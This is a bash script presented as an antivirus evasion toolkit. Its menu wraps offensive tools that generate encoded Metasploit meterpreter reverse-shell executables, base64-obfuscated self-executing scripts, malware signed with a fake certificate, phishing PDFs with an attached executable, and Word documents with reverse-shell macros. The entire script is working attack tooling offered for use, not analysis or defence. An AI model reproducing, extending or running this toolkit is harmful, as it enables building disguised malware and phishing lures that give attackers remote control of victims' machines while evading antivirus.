#!/bin/bash

# Large ASCII Bunny
echo -e "\033[1;36m"
cat << "EOF"
  / \ / \ / \ / \ 
 ( W ( H ( O ( A )
  \_/ \_/ \_/ \_/ 
  / \ / \ / \ / \ 
 ( M ( I & ( Y ( S )
  \_/ \_/ \_/ \_/ 
   )   )   )   )  
  / \ / \ / \ / \ 
 ( 🐇  BUNNY  🛡️ )
  \_/ \_/ \_/ \_/ 
EOF
echo -e "\033[1;33m           BY WHOAMI & YSL\033[0m"
echo -e "\033[1;36m=== AV Evasion Toolkit v2.1 ===\033[0m"

# Main Menu
while true; do
    echo -e "\n\033[1;34m[+] Select option:\033[0m"
    echo "1. Generate encrypted msfvenom payload"
    echo "2. Base64 code obfuscator"
    echo "3. Generate fake-signed malware"
    echo "4. Create phishing PDF with payload"
    echo "5. Word doc with Metasploit reverse shell"
    echo "6. Exit"
    
    read -p "> " choice

    case $choice in
        1)
            read -p "LHOST: " lhost
            read -p "LPORT: " lport
            read -p "Output filename: " outfile
            
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport \
            -e x86/shikata_ga_nai -i 7 -f exe -o $outfile
            
            echo -e "\033[1;32m[+] Encrypted payload saved to $outfile\033[0m"
            ;;
        2)
            read -p "File to obfuscate: " target
            read -p "Output name: " out
            
            b64=$(cat $target | base64 -w0)
            echo "echo '$b64' | base64 -d | bash" > $out
            chmod +x $out
            
            echo -e "\033[1;32m[+] Obfuscated file created: $out\033[0m"
            ;;
        3)
            read -p "C source file: " cfile
            read -p "Output EXE name: " exename
            
            x86_64-w64-mingw32-gcc $cfile -o $exename
            osslsigncode sign -pkcs12 ~/.fake_cert.p12 -pass MyPassword123 \
              -in $exename -out "signed_$exename"
            
            echo -e "\033[1;32m[+] Signed executable: signed_$exename\033[0m"
            ;;
        4)
            read -p "PDF template: " pdftemplate
            read -p "Payload EXE: " payload
            read -p "Output PDF: " pdfout
            
            pdftk $pdftemplate attach_file $payload output $pdfout
            
            echo -e "\033[1;32m[+] Malicious PDF created: $pdfout\033[0m"
            ;;
        5)
            read -p "LHOST: " lhost
            read -p "LPORT: " lport
            read -p "Output document: " docname
            
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport \
              -f vba-psh > /tmp/macro.txt
              
            macro_pack --template templates/clean_doc.docx -o $docname /tmp/macro.txt
            
            echo -e "\033[1;32m[+] Malicious Word document: $docname\033[0m"
            ;;
        6)
            echo -e "\033[1;31m[!] Exiting...\033[0m"
            exit 0
            ;;
        *)
            echo -e "\033[1;31m[!] Invalid option\033[0m"
            ;;
    esac
done
